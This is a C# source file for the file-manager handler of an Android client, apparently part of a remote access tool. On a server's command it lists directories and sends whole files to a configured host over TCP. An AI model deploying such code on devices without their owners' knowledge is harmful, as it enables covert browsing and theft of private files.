using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using Android.Graphics;
using SharedLibraries.Helper;
using SharedLibraries.Packet.Commands;
using SharedLibraries.Packet.Interfaces;
using SharedLibraries.Packet.Serialization;

namespace ClientAndroid.Project.PacketHandler
{
    public class HandleFileManager
    {
        public void GetPath(string path)
        {
            Console.WriteLine($"Android: GetPath {path}");
            try
            {
                // two new list to add files and folders
                PacketFileManager_GetPath packetGetPath = new PacketFileManager_GetPath
                {
                    Path = path,
                    ListFiles = new List<PacketFileManager_FilePacket>(),
                    ListFolders = new List<PacketFileManager_FolderPacket>(),
                };

                foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories())
                {
                    packetGetPath.ListFolders.Add(new PacketFileManager_FolderPacket
                    {
                        FullPath = folder.FullName,
                        Name = folder.Name,
                        DateCreation = folder.CreationTime.ToUniversalTime(),
                    });
                }

                foreach (FileInfo file in new DirectoryInfo(path).GetFiles())
                {
                    packetGetPath.ListFiles.Add(new PacketFileManager_FilePacket
                    {
                        FullPath = file.FullName,
                        Name = file.Name,
                        Icon = ResizeImage(file.FullName),
                        Size = Convertor.IntegerToUnitData(file.Length),
                        DateCreation = file.CreationTime.ToUniversalTime(),
                    });
                }
                SocketClient.Send(packetGetPath);
            }
            catch (Exception ex)
            {
                SocketClient.Send(new PacketFileManager_GetPath { Error = ex.Message });
            }
        }

        public byte[] ResizeImage(string sourceFile)
        {

            try
            {
                var options = new BitmapFactory.Options()
                {
                    InJustDecodeBounds = false,
                    InPurgeable = true,
                };

                using (var image = BitmapFactory.DecodeFile(sourceFile, options))
                using (var bitmapScaled = Bitmap.CreateScaledBitmap(image, 48, 48, true))
                using (MemoryStream stream = new MemoryStream())
                {
                    bitmapScaled.Compress(Bitmap.CompressFormat.Jpeg, 100, stream);
                    return stream.ToArray();
                }
            }
            catch
            {
                return new byte[0];
            }
        }


        #region Download File
        public void DownloadFile(PacketFileManager_DownloadFile packet)
        {
            FileInfo fileInfo = new FileInfo(packet.FullPath);
            if (fileInfo.Exists)
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(Configuration.Host, Configuration.Port);
                if (socket.Connected)
                {
                    string fileId = Guid.NewGuid().ToString();
                    SendSocket(new PacketFileManager_DownloadFile
                    {
                        FullPath = packet.FullPath,
                        SocketId = Configuration.Id,
                        Size = fileInfo.Length,
                        FileId = fileId,
                    }, socket);

                    SendSocket(new PacketFileManager_DownloadFile
                    {
                        ByteArray = File.ReadAllBytes(packet.FullPath),
                        FullPath = packet.FullPath,
                        SocketId = Configuration.Id,
                        FileId = fileId,
                    }, socket);
                }
            }
        }

        private void SendSocket(IPacket packet, Socket socket)
        {
            byte[] buffer = Serialize.PacketSerialize(packet);
            byte[] bufferSize = BitConverter.GetBytes(buffer.Length);
            Console.WriteLine($"DownloadFile: Sending {buffer.Length}");

            socket.Poll(-1, SelectMode.SelectWrite);
            socket.Send(bufferSize, 0, bufferSize.Length, SocketFlags.None);
            socket.SendBufferSize = buffer.Length;
            using (MemoryStream memoryStream = new MemoryStream(buffer))
            {
                int read = 0;
                memoryStream.Position = 0;
                byte[] chunk = new byte[50 * 1000];
                while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                {
                    socket.Poll(-1, SelectMode.SelectWrite);
                    int sent = socket.Send(chunk, 0, read, SocketFlags.None);
                    Console.WriteLine($"DownloadFile: Sent {sent}");
                }
            }
        }
        #endregion
    }
}
